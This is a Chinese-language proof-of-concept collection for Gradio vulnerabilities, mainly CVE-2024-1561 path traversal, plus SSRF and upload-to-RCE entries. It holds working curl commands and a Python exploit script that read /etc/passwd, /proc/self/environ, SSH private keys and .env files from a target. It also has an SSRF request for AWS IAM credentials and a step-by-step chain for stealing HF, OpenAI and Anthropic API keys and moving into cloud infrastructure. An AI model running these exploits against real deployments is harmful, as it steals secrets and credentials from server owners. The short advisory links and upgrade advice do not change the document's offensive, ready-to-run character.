# Gradio 漏洞 POC

## 系统简介

Gradio 是一款 Python 库，用于快速构建和共享机器学习模型演示 Web 应用。广泛用于 Hugging Face Spaces 等平台。

---

## CVE-2024-1561 — 任意本地文件读取（路径遍历）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-1561 |
| CVSS | 高危 |
| 漏洞类型 | 路径遍历 / 任意文件读取 |
| 认证要求 | 无需认证 |
| 影响版本 | Gradio 3.47 — 4.12（修复于 4.13） |
| 修复版本 | 4.13 |

### 漏洞原理

`/component_server` API 端点在调用组件对象的内部方法时，未对用户提供的函数名进行验证，允许攻击者调用 `move_resource_to_block_cache` 等内部方法。

- **Gradio 4.3–4.12**：利用 `move_resource_to_block_cache` 函数，该函数将任意文件系统路径复制到 Gradio 临时目录，随后通过 `/file` 端点访问
- **Gradio 3.47–3.50.2**：利用 `make_temp_copy_if_needed` 实现本地文件读取，利用 `download_temp_copy_if_needed` 实现 SSRF

### POC — 读取 /etc/passwd（Gradio 4.x）

```bash
# 步骤一：触发文件复制到临时目录
curl -X POST http://target:7860/component_server \
  -H 'Content-Type: application/json' \
  -d '{
    "component_id": "1",
    "data": "/etc/passwd",
    "fn_name": "move_resource_to_block_cache",
    "session_hash": "aaaaaa"
  }'

# 响应将包含临时文件路径，例如：
# {"path": "/tmp/.../passwd"}

# 步骤二：下载读取文件
curl http://target:7860/file=/tmp/gradio/xxx/passwd
```

### POC — 读取环境变量（Hugging Face Spaces）

```bash
# 读取 /proc/self/environ 获取所有环境变量（含 API 密钥等 Secrets）
curl -X POST http://target:7860/component_server \
  -H 'Content-Type: application/json' \
  -d '{
    "component_id": "1",
    "data": "/proc/self/environ",
    "fn_name": "move_resource_to_block_cache",
    "session_hash": "aaaaaa"
  }'

# 获取返回的临时路径后：
curl "http://target:7860/file=<returned_path>"
```

### POC — 读取任意敏感文件

```bash
# 读取 SSH 私钥
curl -X POST http://target:7860/component_server \
  -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/root/.ssh/id_rsa","fn_name":"move_resource_to_block_cache","session_hash":"test"}'

# 读取应用配置文件
curl -X POST http://target:7860/component_server \
  -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/app/.env","fn_name":"move_resource_to_block_cache","session_hash":"test"}'
```

### Python 自动化利用脚本

```python
import requests
import sys

TARGET = sys.argv[1]  # e.g., http://target:7860
FILE = sys.argv[2]    # e.g., /etc/passwd

# Step 1: Trigger file copy
r = requests.post(f"{TARGET}/component_server", json={
    "component_id": "1",
    "data": FILE,
    "fn_name": "move_resource_to_block_cache",
    "session_hash": "pwn"
})
tmp_path = r.json().get("path") or r.json().get("url", "")

# Step 2: Download file
r2 = requests.get(f"{TARGET}/file={tmp_path}")
print(r2.text)
```

### 利用步骤

1. 确认目标运行 Gradio 4.3–4.12
2. 向 `/component_server` 发送 POST 请求，`fn_name` 设为 `move_resource_to_block_cache`
3. `data` 字段填写目标文件路径（如 `/etc/passwd`, `/proc/self/environ`）
4. 从响应中获取临时文件路径
5. 通过 `/file=` 端点下载读取文件内容

### 修复建议

升级至 Gradio 4.13 或更高版本（2024年1月3日发布修复）。

---

## CVE-2024-2206 — SSRF（通过 URL 文件加载）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-2206 |
| CVSS | 7.5 (HIGH) |
| 漏洞类型 | 服务端请求伪造（SSRF） |
| 影响版本 | Gradio 4.x（部分版本） |

```bash
# 访问 AWS 元数据服务
curl -X POST http://target:7860/upload \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

---

## CVE-2024-47084 — 任意文件上传 → RCE（CVSS 9.8）

### 漏洞信息

| 字段 | 详情 |
|------|------|
| CVE | CVE-2024-47084 |
| CVSS | 9.8 (CRITICAL) |
| 影响版本 | Gradio < 4.42.0 |

上传处理器未充分限制文件类型和路径，结合路径遍历逻辑可向服务器任意位置写入文件，进而实现 RCE。

---

## 完整攻击链（Hugging Face Spaces 场景）

1. 通过 `x-gradio-version` 响应头或 `/info` 确认版本 < 4.13
2. 利用 CVE-2024-1561 读取 `/proc/self/environ` 获取所有环境变量
3. 提取 `HF_TOKEN`、`OPENAI_API_KEY`、`ANTHROPIC_API_KEY` 等 API 密钥
4. 利用 CVE-2024-2206 SSRF 访问云元数据服务获取 IAM 凭据
5. 横向移动至云基础设施

### 参考资料

- [Horizon3.ai 技术分析](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [NVD CVE-2024-1561](https://nvd.nist.gov/vuln/detail/CVE-2024-1561)
- [GitHub Advisory GHSA-g9cj-cfpp-4g2x](https://github.com/advisories/GHSA-g9cj-cfpp-4g2x)
- [Miggo 漏洞数据库](https://www.miggo.io/vulnerability-database/cve/CVE-2024-1561)
- [EthicalHacking.uk](https://ethicalhacking.uk/cve-2024-1561-unauthorized-local-file-read-vulnerability-in-gradio/)
- [Tenable Plugin 114409](https://www.tenable.com/plugins/was/114409)
